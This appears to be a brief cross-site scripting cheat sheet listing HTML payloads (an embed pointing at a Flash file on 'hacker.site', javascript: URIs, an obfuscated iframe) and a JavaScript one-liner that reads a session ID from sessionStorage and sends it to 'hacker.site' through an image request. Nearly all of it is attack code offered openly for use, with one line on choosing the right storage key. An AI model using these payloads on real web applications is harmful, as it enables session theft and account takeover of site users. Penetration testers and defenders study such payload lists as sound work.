## Payloads
```html
<embed src="http://hacker.site/evil.swf">
<embed src="javascript:alert(1)">
<iframe src='jAvAsCripT:alert`1`'></iframe>


```

## Extract Session Data
```js
new Image().src ="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
```

> Despite `document.cookie`, the attacker needs to be more precise because the name of the key used to store the session ID may change

